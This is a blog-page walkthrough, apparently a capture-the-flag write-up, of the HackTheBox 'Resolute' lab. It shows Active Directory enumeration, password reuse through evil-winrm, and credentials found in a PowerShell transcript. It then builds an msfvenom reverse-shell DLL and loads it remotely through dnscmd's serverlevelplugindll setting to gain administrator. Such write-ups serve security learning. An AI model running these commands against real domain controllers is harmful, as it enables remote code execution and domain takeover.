@@ -1,0 +1,1135 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js">
+  <head>
+    <meta charset="utf-8">
+<!-- begin _includes/seo.html --><title>HackTheBox Resolute - Dcodezero</title>
+<meta name="description" content="Running enum4linux against the box we got some usernames and a password for user marko . After some hit and try we got succeed to login as melanie using evil-winrm. After some manual enumeration i got a hidden file in a hidden directory. Which contains credentials of the user ryan. After Switching to ryan we came to know that ryan is in the group of dnsadmin. Crafting a malicious dll file and adding the entry of our dll as the server plugin and restarting the service we will able to execute our dll as admin.">
+
+
+  <meta name="author" content="DcodeZer0">
+  
+  <meta property="article:author" content="DcodeZer0">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Dcodezero">
+<meta property="og:title" content="HackTheBox Resolute">
+<meta property="og:url" content="http://localhost:4000/hackthebox/Resolute/">
+
+
+  <meta property="og:description" content="Running enum4linux against the box we got some usernames and a password for user marko . After some hit and try we got succeed to login as melanie using evil-winrm. After some manual enumeration i got a hidden file in a hidden directory. Which contains credentials of the user ryan. After Switching to ryan we came to know that ryan is in the group of dnsadmin. Crafting a malicious dll file and adding the entry of our dll as the server plugin and restarting the service we will able to execute our dll as admin.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/img/sample/res.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2020-05-31T00:00:00+05:30">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/hackthebox/Resolute/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
+
+
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
+
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ window.enable_copy_code_button = true;
+</script>
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single" dir="ltr">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/brew.webp" alt="Dcodezero"></a>
+        
+        <a class="site-title" href="/">
+          Dcodezero
+          <span class="site-subtitle">Hack>>Sleep>>Repeat</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/categories/"
+                
+                
+              >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tags"
+                
+                
+              >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/it-posts/"
+                
+                
+              >I.T</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/tools/"
+                
+                
+              >Tools</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/helpedyou/"
+                
+                
+              >Think I Helped You?</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/assets/img/sample/res.png');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          HackTheBox Resolute
+
+        
+      </h1>
+      
+        <p class="page__lead">Running enum4linux against the box we got some usernames and a password for user marko . After some hit and try we got succeed to login as melanie using evil-winrm. After some manual enumeration i got a hidden file in a hidden directory. Which contains credentials of the user ryan. After Switching to ryan we came to know that ryan is in the group of dnsadmin. Crafting a malicious dll file and adding the entry of our dll as the server plugin and restarting the service we will able to execute our dll as admin.
+</p>
+      
+      
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2020-05-31T00:00:00+05:30">May 31, 2020</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+  </p>
+
+
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/" itemprop="item"><span itemprop="name">Home</span></a>
+
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="/categories/#hackthebox" itemprop="item"><span itemprop="name">Hackthebox</span></a>
+          <meta itemprop="position" content="2" />
+        </li>
+        <span class="sep">/</span>
+      
+    
+      
+      
+        <li class="current">HackTheBox Resolute</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/brew.webp" alt="DcodeZer0" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">DcodeZer0</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>┌──[root@dcodezero]
+└──╼ # Hacker | RedTeam | PenTester | CTFPlayer | HackTheBox</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twitter.com/Dcodezer0" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/DcodeZero" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://app.hackthebox.com/profile/291968" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fa-solid fa-cube" aria-hidden="true"></i><span class="label">Hackthebox</span></a></li>
+          
+        
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:dcodezero@proton.me" rel="me" class="u-email">
+            <meta itemprop="email" content="dcodezero@proton.me" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox Resolute">
+    <meta itemprop="description" content="Running enum4linux against the box we got some usernames and a password for user marko . After some hit and try we got succeed to login as melanie using evil-winrm. After some manual enumeration i got a hidden file in a hidden directory. Which contains credentials of the user ryan. After Switching to ryan we came to know that ryan is in the group of dnsadmin. Crafting a malicious dll file and adding the entry of our dll as the server plugin and restarting the service we will able to execute our dll as admin.">
+    <meta itemprop="datePublished" content="2020-05-31T00:00:00+05:30">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#lets-get-started">Let’s get started</a><ul><li><a href="#as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</a></li><li><a href="#using-enum4linux-as-the-next-step">Using Enum4linux as the next step:</a></li><li><a href="#enum4linux">Enum4linux</a></li><li><a href="#userlist">UserList</a></li><li><a href="#something-useful">something useful</a></li><li><a href="#getting-the-user">Getting the User</a></li></ul></li><li><a href="#privlilege-escalation">Privlilege Escalation</a><ul><li><a href="#this-is-the-link-that-helped-me">This is the link that helped me…</a></li><li><a href="#start-the-msfconsole-and-setup-the-listener">start the msfconsole and setup the listener.</a></li><li><a href="#now-the-first-command-is-to-run-the-dll-file-and-the-second-and-third-commands-are-to-stop-and-start-the-service-respectively">now the first command is to run the .dll file and the second and third commands are to stop and start the service respectively.</a></li></ul></li><li><a href="#and-we-get-the-shell-as-administrator">And we get the shell as administrator</a></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="lets-get-started">Let’s get started</h2>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>resolute nmap -sC -sV -p- -v -oA scans/nmap-full -T4 resolute.htb
+Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-29 09:31 EDT
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 09:31
+Completed NSE at 09:31, 0.00s elapsed
+Initiating NSE at 09:31
+Completed NSE at 09:31, 0.00s elapsed
+Initiating Ping Scan at 09:31
+Scanning resolute.htb (10.10.10.169) [4 ports]
+Completed Ping Scan at 09:31, 0.59s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 09:31
+Scanning resolute.htb (10.10.10.169) [65535 ports]
+Discovered open port 445/tcp on 10.10.10.169
+Discovered open port 139/tcp on 10.10.10.169
+Discovered open port 135/tcp on 10.10.10.169
+Discovered open port 53/tcp on 10.10.10.169
+Discovered open port 49677/tcp on 10.10.10.169
+NSE: Script scanning 10.10.10.169.
+Initiating NSE at 09:52
+Completed NSE at 09:54, 121.80s elapsed
+Initiating NSE at 09:54
+Completed NSE at 09:54, 1.93s elapsed
+Nmap scan report for resolute.htb (10.10.10.169)
+Host is up (0.36s latency).
+Not shown: 65510 closed ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+| fingerprint-strings:
+|   DNSVersionBindReqTCP:
+|     version
+|_    bind
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-29 04:29:54Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49684/tcp open  msrpc        Microsoft Windows RPC
+49712/tcp open  msrpc        Microsoft Windows RPC
+64798/tcp open  tcpwrapped
+64974/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.70%I=7%D=5/29%Time=5ED11327%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+Host script results:
+|_clock-skew: mean: -7h00m31s, deviation: 4h02m32s, median: -9h20m33s
+| smb-os-discovery:
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2020-05-28T21:32:12-07:00
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled and required
+| smb2-time:
+|   date: 2020-05-29 00:32:10
+|_  start_date: 2020-05-28 18:33:16
+
+NSE: Script Post-scanning.
+Initiating NSE at 09:54
+Completed NSE at 09:54, 0.00s elapsed
+Initiating NSE at 09:54
+Completed NSE at 09:54, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1372.93 seconds
+Raw packets sent: 72795 (3.203MB) | Rcvd: 69585 (2.784MB)
+</code></pre></div></div>
+
+<h3 id="using-enum4linux-as-the-next-step">Using Enum4linux as the next step:</h3>
+
+<h3 id="enum4linux">Enum4linux</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat May 30 07:44:42 2020
+========================== 
+|    Target Information    |
+========================== 
+Target ........... resolute.htb
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+==================================================== 
+|    Enumerating Workgroup/Domain on resolute.htb    |
+==================================================== 
+[E] Cant find workgroup/domain
+============================================ 
+|    Nbtstat Information for resolute.htb    |
+============================================             
+Unknown parameter encountered: "winbind trusted domains only"
+Ignoring unknown parameter "winbind trusted domains only"
+Looking up status of 10.10.10.169
+No reply from 10.10.10.169                   
+</code></pre></div></div>
+
+<h3 id="userlist">UserList</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+user:[marko] rid:[0x457]
+user:[sunita] rid:[0x19c9]
+user:[abigail] rid:[0x19ca]
+user:[marcus] rid:[0x19cb]
+user:[sally] rid:[0x19cc]
+user:[fred] rid:[0x19cd]
+user:[angela] rid:[0x19ce]
+user:[felicia] rid:[0x19cf]
+user:[gustavo] rid:[0x19d0]
+user:[ulf] rid:[0x19d1]
+user:[stevie] rid:[0x19d2]
+user:[claire] rid:[0x19d3]
+user:[paulo] rid:[0x19d4]
+user:[steve] rid:[0x19d5]
+user:[annette] rid:[0x19d6]
+user:[annika] rid:[0x19d7]
+user:[per] rid:[0x19d8]
+user:[claude] rid:[0x19d9]
+user:[melanie] rid:[0x2775]
+user:[zach] rid:[0x2776]
+user:[simon] rid:[0x2777]
+user:[naoki] rid:[0x2778]
+</code></pre></div></div>
+
+<h3 id="something-useful">something useful</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>============================= 
+|    Users on resolute.htb    |
+============================= 
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	
+Name: Marko Novak
+Desc: Account created. Password set to Welcome123!
+</code></pre></div></div>
+
+<h3 id="getting-the-user">Getting the User</h3>
+
+<p>So i used evil-winrm using user marko and pass Welcome123!<br />
+Which returned nothing…</p>
+
+<p>So I treid the same password with all the users that I’ve found with the help of crackmapexe….<br />
+Which returned this<br />
+Username and password melanie:Welcome123!</p>
+
+<p>Again with the help of EVIL-WINRM I was able to login and get the USER.txt….</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u melanie -p Welcome123! -i 10.10.10.169
+</code></pre></div></div>
+
+<p>Diggin in a little bit more deeper and searching for all the hidden files and directories, I found this..</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /
+dir -force
+cd PSTranscripts
+cd 20191203
+cat PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
+</code></pre></div></div>
+
+<p>This Powershell script will reveal the password of the other user on the domain,<br />
+ryan : Serv3r4Admin4cc123!<br />
+Immediately jumping into Evil-Winrm and using Ryan credentials, got the shell of Ryan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u ryan -p Serv3r4Admin4cc123! -i 10.10.10.169 
+</code></pre></div></div>
+
+<h2 id="privlilege-escalation">Privlilege Escalation</h2>
+
+<p>Exploring the directories of ryan, found note.txt. Which says<br />
+“Email to team: - due to change freeze, any system changes (apart from those to the administrator account) will be automatically reverted within 1 minute”<br />
+Finding out the permissions of Ryan</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\ryan\Desktop&gt; whoami /all 
+USER INFORMATION
+----------------
+User Name     SID
+============= ==============================================
+megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105
+GROUP INFORMATION
+-----------------
+Group Name                                 Type             SID                                            
+========================================== ================ ============================================== 
+Everyone                                   Well-known group S-1-1-0                                        
+BUILTIN\Users                              Alias            S-1-5-32-545                                   
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+USER CLAIMS INFORMATION
+-----------------------
+User claims unknown.
+Kerberos support for Dynamic Access Control on this device has been disabled.
+C:\Users\ryan\Desktop&gt; whoami /all
+USER INFORMATION
+----------------
+User Name     SID
+============= ==============================================
+megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105
+GROUP INFORMATION
+-----------------
+Group Name                                 Type             SID     
+========================================== ================ ============================================== 
+Everyone                                   Well-known group S-1-1-0                                        
+BUILTIN\Users                              Alias            S-1-5-32-545                                   
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+USER CLAIMS INFORMATION
+-----------------------
+User claims unknown.
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</code></pre></div></div>
+
+<p>Seeing that Ryan is a member of DNSAdmins of Megabank.local, we can escalate our privileges from DNS admin to administrator.</p>
+
+<h3 id="this-is-the-link-that-helped-me">This is the link that helped me…</h3>
+
+<p>https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise</p>
+
+<p><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise"><img src="images/d2d.png" alt="" /></a><br />
+Quickly generating a msfpayload and uploading the file.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=tun0 lport=3333 -f dll &gt; plugin.dll
+</code></pre></div></div>
+
+<p>uploading the file using impacket script.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ./smbserver.py -smb2support jeevan /home/stuxnet` 
+</code></pre></div></div>
+
+<h3 id="start-the-msfconsole-and-setup-the-listener">start the msfconsole and setup the listener.</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    &gt; msfconsole 
+    &gt; use multi/handler 
+    &gt; set payload windows/x64/meterpreter/reverse_tcp 
+    &gt; set lhost tun0 
+    &gt; set lport 3333 
+    &gt; exploit
+</code></pre></div></div>
+
+<h3 id="now-the-first-command-is-to-run-the-dll-file-and-the-second-and-third-commands-are-to-stop-and-start-the-service-respectively">now the first command is to run the .dll file and the second and third commands are to stop and start the service respectively.</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    C:\Users\ryan\Desktop&gt; dnscmd.exe /config /serverlevelplugindll \\10.10.14.47\jeevan\plugin.dll 
+    sc.exe stop dns 
+    sc.exe start dns 
+</code></pre></div></div>
+
+<h2 id="and-we-get-the-shell-as-administrator">And we get the shell as administrator</h2>
+
+<p><img src="/assets/img/sample/resolute.png" alt="" /></p>
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
+
+<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#activedirectory" class="page__taxonomy-item p-category" rel="tag">activedirectory,</a><span class="sep">, </span>
+    
+      <a href="/tags/#evilwinrm" class="page__taxonomy-item p-category" rel="tag">evilwinrm,</a><span class="sep">, </span>
+    
+      <a href="/tags/#hashcat" class="page__taxonomy-item p-category" rel="tag">hashcat,</a><span class="sep">, </span>
+    
+      <a href="/tags/#impacket" class="page__taxonomy-item p-category" rel="tag">impacket</a><span class="sep">, </span>
+    
+      <a href="/tags/#windows" class="page__taxonomy-item p-category" rel="tag">windows,</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2020-05-31T00:00:00+05:30">May 31, 2020</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://twitter.com/intent/tweet?text=HackTheBox+Resolute%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FResolute%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2FResolute%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/hackthebox/Resolute/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/hackthebox/Forest/" class="pagination--pager" title="HackTheBox Forest">Previous</a>
+    
+    
+      <a href="/hackthebox/Monteverde/" class="pagination--pager" title="HackTheBox Monteverde">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/malleablec2.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/Malleable-c2-pro/" rel="permalink">Cobalt Strike Malleable C2 Profiles
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-12-25T00:00:00+05:30">December 25, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Hide from blue team like a pro by using malleable c2 profiles.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/sample/homelab/cs.webp" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/red-team/redirectors/" rel="permalink">Cobalt Strike Redirectors using Apache-SSL
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
